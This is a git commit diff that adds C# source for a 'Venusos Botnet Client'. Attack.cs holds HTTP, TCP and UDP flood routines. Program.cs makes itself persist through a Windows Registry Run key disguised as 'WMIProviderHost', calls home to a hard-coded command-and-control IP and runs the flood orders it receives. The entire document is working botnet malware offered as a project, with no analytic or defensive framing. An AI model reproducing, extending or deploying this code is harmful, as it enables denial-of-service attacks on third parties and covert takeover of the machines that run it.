1bcf4553c9856e2220ed24fd93a0b434eacc713d
John <janekpieklo@icloud.com>
2022-04-26 20:36:09 +0200

    Changed dir name

---
+++ Venusos Botnet Client/Attack.cs
@@ -0,0 +1,78 @@
+﻿using System.Diagnostics;
+using System.Net.Sockets;
+using System.Text;
+
+namespace Venusos_Botnet_Client
+{
+    public class Attack
+    {
+        private readonly string ip;
+        private readonly int port;
+        private readonly int duration;
+        private readonly int threads;
+        public Attack(Command command)
+        {
+            ip = command.IP;
+            port = command.Port;
+            duration = command.Duration;
+            threads = command.Threads;
+        }
+        public void Http()
+        {
+            Task.Run(() =>
+            {
+                HttpRequestMessage request;
+                Stopwatch timer = new Stopwatch();
+                HttpClient httpClient = new HttpClient();
+
+                timer.Start();
+
+                while (timer.Elapsed.TotalSeconds < duration)
+                {
+                    request = new HttpRequestMessage(new HttpMethod("GET"), ip);
+                    request.Headers.TryAddWithoutValidation("accept", "text/plain");
+                    httpClient.SendAsync(request);
+                    Thread.Sleep(1000 / threads);
+                }
+
+                timer.Stop();
+            });
+        }
+        public void Tcp()
+        {
+            Task.Run(() =>
+            {
+                Stopwatch timer = new Stopwatch();
+                NetworkStream stream = new TcpClient(ip, port).GetStream();
+
+                timer.Start();
+
+                while (timer.Elapsed.TotalSeconds < duration)
+                {
+                    stream.WriteAsync(Encoding.ASCII.GetBytes("O_O"), 0, 3);
+                    Thread.Sleep(1000 / threads);
+                }
+
+                timer.Stop();
+            });
+        }
+        public void Udp()
+        {
+            Task.Run(() =>
+            {
+                Stopwatch timer = new Stopwatch();
+                UdpClient udpClient = new UdpClient(ip, port);
+
+                timer.Start();
+
+                while (timer.Elapsed.TotalSeconds < duration)
+                {
+                    udpClient.SendAsync(Encoding.ASCII.GetBytes("^_^"), 3);
+                    Thread.Sleep(1000 / threads);
+                }
+
+                timer.Stop();
+            });
+        }
+    }
+}
---
+++ Venusos Botnet Client/Program.cs
@@ -0,0 +1,63 @@
+﻿using System.Net.Sockets;
+using System.Text;
+using System.Text.Json;
+using Venusos_Botnet_Client;
+
+Thread.Sleep(10000);
+
+try
+{
+    Microsoft.Win32.RegistryKey key;
+    key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+    key.SetValue("WMIProviderHost", Path.Combine(Environment.CurrentDirectory, System.Reflection.Assembly.GetExecutingAssembly().GetName().Name));
+    key.Close();
+}
+catch (Exception)
+{
+
+}
+
+while (true)
+{
+    try
+    {
+        TcpClient tcpClient = new TcpClient("18.134.47.108", 1000);
+        NetworkStream networkStream = tcpClient.GetStream();
+
+        int i = 0;
+        string data = "";
+        byte[] bytes = new byte[256];
+
+        while ((i = networkStream.Read(bytes)) != 0)
+        {
+            data = Encoding.ASCII.GetString(bytes, 0, i);
+
+            if (data == "Are you alive?")
+            {
+                networkStream.Write(Encoding.ASCII.GetBytes("I am alive!"), 0, 11);
+            }
+            else
+            {
+                Command command = JsonSerializer.Deserialize<Command>(data);
+                Attack attack = new Attack(command);
+
+                switch (command.Method)
+                {
+                    case "http":
+                        attack.Http();
+                        break;
+                    case "tcp":
+                        attack.Tcp();
+                        break;
+                    case "udp":
+                        attack.Udp();
+                        break;
+                }
+            }
+        }
+    }
+    catch (Exception)
+    {
+
+    }
+}
